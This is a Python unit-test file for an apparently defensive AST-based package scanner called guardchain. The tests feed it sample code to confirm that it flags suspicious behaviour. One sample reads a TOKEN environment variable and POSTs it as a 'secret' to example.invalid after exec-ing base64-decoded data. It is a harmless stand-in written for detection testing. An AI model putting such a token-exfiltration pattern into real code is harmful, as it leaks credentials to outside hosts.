from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from guardchain.ast_analyzer import analyze_ast, get_call_name
from guardchain.models import PackageContext


class AstAnalyzerTests(unittest.TestCase):
    def test_call_name_for_nested_attribute(self) -> None:
        import ast

        expr = ast.parse("urllib.request.urlopen('https://example.invalid')").body[0].value
        self.assertEqual(get_call_name(expr.func), "urllib.request.urlopen")

    def test_behavior_rules(self) -> None:
        code = """
import base64
import os
import requests
import subprocess

payload = base64.b64decode("cHJpbnQoJ2RlbW8nKQ==")
exec(payload)
subprocess.run(["python", "--version"])
secret = os.environ.get("TOKEN")
requests.post("https://example.invalid", json={"secret": secret})
"""
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "pkg.py"
            path.write_text(code, encoding="utf-8")
            context = PackageContext(root, "pkg", [path], [], [], None, None)
            rule_ids = {finding.rule_id for finding in analyze_ast(context)}

        self.assertIn("B001", rule_ids)
        self.assertIn("B002", rule_ids)
        self.assertIn("B003", rule_ids)
        self.assertIn("B004", rule_ids)
        self.assertIn("B005", rule_ids)
        self.assertIn("B006", rule_ids)
        self.assertIn("B008", rule_ids)
        self.assertIn("B009", rule_ids)

    def test_alias_resolution(self) -> None:
        code = """
import subprocess as sp
from subprocess import Popen
from requests import post
import urllib.request as ur

sp.run(["echo", "demo"])
Popen(["echo", "demo"])
post("http://example.invalid", data={})
ur.urlopen("http://example.invalid")
"""
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "pkg.py"
            path.write_text(code, encoding="utf-8")
            context = PackageContext(root, "pkg", [path], [], [], None, None)
            findings = analyze_ast(context)
        evidence = " ".join(str(finding.evidence) for finding in findings)
        self.assertIn("subprocess.run", evidence)
        self.assertIn("subprocess.Popen", evidence)
        self.assertIn("requests.post", evidence)
        self.assertIn("urllib.request.urlopen", evidence)

    def test_compile_os_system_and_syntax_error(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            good = root / "good.py"
            bad = root / "bad.py"
            good.write_text("import os\ncompile('x=1', '<x>', 'exec')\nos.system('echo simulated')\n", encoding="utf-8")
            bad.write_text("def nope(:\n", encoding="utf-8")
            context = PackageContext(root, "pkg", [good, bad], [], [], None, None)
            rule_ids = {finding.rule_id for finding in analyze_ast(context)}
        self.assertIn("B001", rule_ids)
        self.assertIn("B002", rule_ids)
        self.assertIn("W001", rule_ids)

    def test_no_code_execution(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            marker = root / "marker.txt"
            path = root / "pkg.py"
            path.write_text(f"open(r'{marker}', 'w').write('executed')\n", encoding="utf-8")
            context = PackageContext(root, "pkg", [path], [], [], None, None)
            analyze_ast(context)
            self.assertFalse(marker.exists())


if __name__ == "__main__":
    unittest.main()
